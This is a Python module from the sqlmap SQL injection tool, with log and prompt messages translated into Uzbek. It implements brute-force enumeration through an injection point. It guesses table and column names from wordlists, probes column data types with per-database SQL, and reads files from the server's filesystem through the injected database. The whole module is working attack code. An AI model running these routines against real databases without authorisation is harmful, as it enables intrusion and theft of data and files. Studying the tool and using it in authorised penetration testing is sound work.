#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import division

from lib.core.uzbek import ut
import time

from lib.core.common import Backend
from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import filterListValue
from lib.core.common import getFileItems
from lib.core.common import getPageWordSet
from lib.core.common import hashDBWrite
from lib.core.common import isNoneValue
from lib.core.common import ntToPosixSlashes
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.common import safeStringFormat
from lib.core.common import unArrayizeValue
from lib.core.common import unsafeSQLIdentificatorNaming
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.decorators import stackedmethod
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.exception import SqlmapNoneDataException
from lib.core.settings import BRUTE_COLUMN_EXISTS_TEMPLATE
from lib.core.settings import BRUTE_TABLE_EXISTS_TEMPLATE
from lib.core.settings import METADB_SUFFIX
from lib.core.settings import UPPER_CASE_DBMSES
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.request import inject

def _addPageTextWords():
    wordsList = []

    infoMsg = "veb-sahifadagi so'zlar tekshirish ro'yxatiga qo'shilmoqda"
    logger.info(infoMsg)
    pageWords = getPageWordSet(kb.originalPage)

    for word in pageWords:
        word = word.lower()

        if len(word) > 2 and not word[0].isdigit() and word not in wordsList:
            wordsList.append(word)

    return wordsList

@stackedmethod
def tableExists(tableFile, regex=None):
    if kb.choices.tableExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:
        warnMsg = "'%s' va/yoki '%s' dan foydalanish tavsiya etilmaydi " % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])
        warnMsg += 'keng tarqalgan jadvallar mavjudligini tekshirish uchun'
        logger.warning(warnMsg)

        message = ut('are you sure you want to continue? [y/N] ', 'davom etishni xohlaysizmi? [y/N] ')
        kb.choices.tableExists = readInput(message, default='N', boolean=True)

        if not kb.choices.tableExists:
            return None

    result = inject.checkBooleanExpression("%s" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), randomStr())))

    if result:
        errMsg = "noto'g'ri natijalar sabab jadval mavjudligini tekshirib bo'lmaydi "
        errMsg += '(ehtimol, ishlatilgan inyeksiya '
        errMsg += 'xato natijalarni ajrata olmayapti)'
        raise SqlmapDataException(errMsg)

    pushValue(conf.db)

    if conf.db and Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:
        conf.db = conf.db.upper()

    message = ut('which common tables (wordlist) file do you want to use?\n', "keng tarqalgan jadvallarning qaysi lug'at faylidan foydalanasiz?\n")
    message += ut("[1] default '%s' (press Enter)\n", "[1] standart '%s' (Enter bosing)\n") % tableFile
    message += ut('[2] custom', '[2] boshqa fayl')
    choice = readInput(message, default='1')

    if choice == '2':
        message = ut("what's the custom common tables file location?\n", "jadvallar ro'yxati faylining yo'li qanday?\n")
        tableFile = readInput(message) or tableFile

    infoMsg = "'%s' ro'yxati orqali jadvallar mavjudligi tekshirilmoqda" % tableFile
    logger.info(infoMsg)

    tables = getFileItems(tableFile, lowercase=Backend.getIdentifiedDbms() in (DBMS.ACCESS,), unique=True)
    tables.extend(_addPageTextWords())
    tables = filterListValue(tables, regex)

    for conf.db in (conf.db.split(',') if conf.db else [conf.db]):
        if conf.db and METADB_SUFFIX not in conf.db:
            infoMsg = "'%s' bazasi tekshirilmoqda" % conf.db
            logger.info(infoMsg)

        threadData = getCurrentThreadData()
        threadData.shared.count = 0
        threadData.shared.limit = len(tables)
        threadData.shared.files = []
        threadData.shared.unique = set()

        def tableExistsThread():
            threadData = getCurrentThreadData()

            while kb.threadContinue:
                kb.locks.count.acquire()
                if threadData.shared.count < threadData.shared.limit:
                    table = safeSQLIdentificatorNaming(tables[threadData.shared.count], True)
                    threadData.shared.count += 1
                    kb.locks.count.release()
                else:
                    kb.locks.count.release()
                    break

                if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
                    fullTableName = "%s.%s" % (conf.db, table)
                else:
                    fullTableName = table

                if Backend.isDbms(DBMS.MCKOI):
                    _ = randomInt(1)
                    result = inject.checkBooleanExpression("%s" % safeStringFormat("%d=(SELECT %d FROM %s)", (_, _, fullTableName)))
                else:
                    result = inject.checkBooleanExpression("%s" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), fullTableName)))

                kb.locks.io.acquire()

                if result and table.lower() not in threadData.shared.unique:
                    threadData.shared.files.append(table)
                    threadData.shared.unique.add(table.lower())

                    if conf.verbose in (1, 2) and not conf.api:
                        clearConsoleLine(True)
                        infoMsg = '[%s] [INFO] olindi: %s\n' % (time.strftime("%X"), unsafeSQLIdentificatorNaming(table))
                        dataToStdout(infoMsg, True)

                if conf.verbose in (1, 2):
                    status = '%d/%d items (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                    dataToStdout("\r[%s] [INFO] sinab ko'rildi: %s" % (time.strftime("%X"), status), True)

                kb.locks.io.release()

        try:
            runThreads(conf.threads, tableExistsThread, threadChoice=True)
        except KeyboardInterrupt:
            warnMsg = 'foydalanuvchi jadval mavjudligini tekshirishni '
            warnMsg += "to'xtatdi. Sqlmap qisman natijalarni ko'rsatadi"
            logger.warning(warnMsg)

        clearConsoleLine(True)
        dataToStdout("\n")

        if not threadData.shared.files:
            warnMsg = 'hech qanday jadval topilmadi'
            if conf.db:
                warnMsg += " '%s' bazasi uchun" % conf.db
            logger.warning(warnMsg)
        else:
            for item in threadData.shared.files:
                if conf.db not in kb.data.cachedTables:
                    kb.data.cachedTables[conf.db] = [item]
                else:
                    kb.data.cachedTables[conf.db].append(item)

        for _ in ((conf.db, item) for item in threadData.shared.files):
            if _ not in kb.brute.tables:
                kb.brute.tables.append(_)

    conf.db = popValue()
    hashDBWrite(HASHDB_KEYS.KB_BRUTE_TABLES, kb.brute.tables, True)

    return kb.data.cachedTables

def columnExists(columnFile, regex=None):
    if kb.choices.columnExists is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:
        warnMsg = "'%s' va/yoki '%s' dan foydalanish tavsiya etilmaydi " % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])
        warnMsg += 'keng tarqalgan ustunlar mavjudligini tekshirish uchun'
        logger.warning(warnMsg)

        message = ut('are you sure you want to continue? [y/N] ', 'davom etishni xohlaysizmi? [y/N] ')
        kb.choices.columnExists = readInput(message, default='N', boolean=True)

        if not kb.choices.columnExists:
            return None

    if not conf.tbl:
        errMsg = 'jadval parametri kiritilmagan'
        raise SqlmapMissingMandatoryOptionException(errMsg)

    if conf.db and Backend.getIdentifiedDbms() in UPPER_CASE_DBMSES:
        conf.db = conf.db.upper()

    result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (randomStr(), randomStr())))

    if result:
        errMsg = "noto'g'ri natijalar sabab ustun mavjudligini tekshirib bo'lmaydi "
        errMsg += '(ehtimol, ishlatilgan inyeksiya '
        errMsg += 'xato natijalarni ajrata olmayapti)'
        raise SqlmapDataException(errMsg)

    message = ut('which common columns (wordlist) file do you want to use?\n', "keng tarqalgan ustunlarning qaysi lug'at faylidan foydalanasiz?\n")
    message += ut("[1] default '%s' (press Enter)\n", "[1] standart '%s' (Enter bosing)\n") % columnFile
    message += ut('[2] custom', '[2] boshqa fayl')
    choice = readInput(message, default='1')

    if choice == '2':
        message = ut("what's the custom common columns file location?\n", "ustunlar ro'yxati faylining yo'li qanday?\n")
        columnFile = readInput(message) or columnFile

    infoMsg = "'%s' ro'yxati orqali ustunlar mavjudligi tekshirilmoqda" % columnFile
    logger.info(infoMsg)

    columns = getFileItems(columnFile, unique=True)
    columns.extend(_addPageTextWords())
    columns = filterListValue(columns, regex)

    for table in conf.tbl.split(','):
        table = safeSQLIdentificatorNaming(table, True)

        if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
            table = "%s.%s" % (safeSQLIdentificatorNaming(conf.db), table)

        kb.threadContinue = True
        kb.bruteMode = True

        threadData = getCurrentThreadData()
        threadData.shared.count = 0
        threadData.shared.limit = len(columns)
        threadData.shared.files = []

        def columnExistsThread():
            threadData = getCurrentThreadData()

            while kb.threadContinue:
                kb.locks.count.acquire()

                if threadData.shared.count < threadData.shared.limit:
                    column = safeSQLIdentificatorNaming(columns[threadData.shared.count])
                    threadData.shared.count += 1
                    kb.locks.count.release()
                else:
                    kb.locks.count.release()
                    break

                if Backend.isDbms(DBMS.MCKOI):
                    result = inject.checkBooleanExpression(safeStringFormat("0<(SELECT COUNT(%s) FROM %s)", (column, table)))
                else:
                    result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (column, table)))

                kb.locks.io.acquire()

                if result:
                    threadData.shared.files.append(column)

                    if conf.verbose in (1, 2) and not conf.api:
                        clearConsoleLine(True)
                        infoMsg = '[%s] [INFO] olindi: %s\n' % (time.strftime("%X"), unsafeSQLIdentificatorNaming(column))
                        dataToStdout(infoMsg, True)

                if conf.verbose in (1, 2):
                    status = "%d/%d items (%d%%)" % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                    dataToStdout("\r[%s] [INFO] sinab ko'rildi: %s" % (time.strftime("%X"), status), True)

                kb.locks.io.release()

        try:
            runThreads(conf.threads, columnExistsThread, threadChoice=True)
        except KeyboardInterrupt:
            warnMsg = 'foydalanuvchi ustun mavjudligini tekshirishni '
            warnMsg += "to'xtatdi. Sqlmap qisman natijalarni ko'rsatadi"
            logger.warning(warnMsg)
        finally:
            kb.bruteMode = False

        clearConsoleLine(True)
        dataToStdout("\n")

        if not threadData.shared.files:
            warnMsg = 'hech qanday ustun topilmadi'
            logger.warning(warnMsg)
        else:
            # Note: a separate name from the 'columns' wordlist (a list reused across the
            # conf.tbl loop); reusing it here would rebind it to a dict and break later tables
            columnData = {}

            for column in threadData.shared.files:
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):
                    result = not inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE %s REGEXP '[^0-9]')", (column, table, column)))
                elif Backend.getIdentifiedDbms() in (DBMS.SQLITE,):
                    result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE %s NOT GLOB '*[^0-9]*')", (column, table, column)))
                elif Backend.getIdentifiedDbms() in (DBMS.MCKOI,):
                    result = inject.checkBooleanExpression("%s" % safeStringFormat("0=(SELECT MAX(%s)-MAX(%s) FROM %s)", (column, column, table)))
                else:
                    result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE ROUND(%s)=ROUND(%s))", (column, table, column, column)))

                if result:
                    columnData[column] = "numeric"
                else:
                    columnData[column] = "non-numeric"

            if conf.db not in kb.data.cachedColumns:
                kb.data.cachedColumns[conf.db] = {}
            kb.data.cachedColumns[conf.db][table] = columnData

            for _ in ((conf.db, table, item[0], item[1]) for item in columnData.items()):
                if _ not in kb.brute.columns:
                    kb.brute.columns.append(_)

    hashDBWrite(HASHDB_KEYS.KB_BRUTE_COLUMNS, kb.brute.columns, True)

    return kb.data.cachedColumns

@stackedmethod
def fileExists(pathFile):
    retVal = []

    message = ut('which common files file do you want to use?\n', "keng tarqalgan fayllarning qaysi ro'yxatidan foydalanasiz?\n")
    message += ut("[1] default '%s' (press Enter)\n", "[1] standart '%s' (Enter bosing)\n") % pathFile
    message += ut('[2] custom', '[2] boshqa fayl')
    choice = readInput(message, default='1')

    if choice == '2':
        message = ut("what's the custom common files file location?\n", "fayllar ro'yxatining yo'li qanday?\n")
        pathFile = readInput(message) or pathFile

    infoMsg = "'%s' ro'yxati orqali fayllar mavjudligi tekshirilmoqda" % pathFile
    logger.info(infoMsg)

    paths = getFileItems(pathFile, unique=True)

    kb.bruteMode = True

    try:
        conf.dbmsHandler.readFile(randomStr())
    except SqlmapNoneDataException:
        pass
    except:
        kb.bruteMode = False
        raise

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(paths)
    threadData.shared.files = []

    def fileExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.count.acquire()
            if threadData.shared.count < threadData.shared.limit:
                path = ntToPosixSlashes(paths[threadData.shared.count])
                threadData.shared.count += 1
                kb.locks.count.release()
            else:
                kb.locks.count.release()
                break

            try:
                result = unArrayizeValue(conf.dbmsHandler.readFile(path))
            except SqlmapNoneDataException:
                result = None

            kb.locks.io.acquire()

            if not isNoneValue(result):
                threadData.shared.files.append(result)

                if not conf.api:
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] olindi: '%s'\n" % (time.strftime("%X"), path)
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = '%d/%d items (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                dataToStdout("\r[%s] [INFO] sinab ko'rildi: %s" % (time.strftime("%X"), status), True)

            kb.locks.io.release()

    try:
        runThreads(conf.threads, fileExistsThread, threadChoice=True)
    except KeyboardInterrupt:
        warnMsg = 'foydalanuvchi fayl mavjudligini tekshirishni '
        warnMsg += "to'xtatdi. Sqlmap qisman natijalarni ko'rsatadi"
        logger.warning(warnMsg)
    finally:
        kb.bruteMode = False

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.files:
        warnMsg = 'hech qanday fayl topilmadi'
        logger.warning(warnMsg)
    else:
        retVal = threadData.shared.files

    return retVal
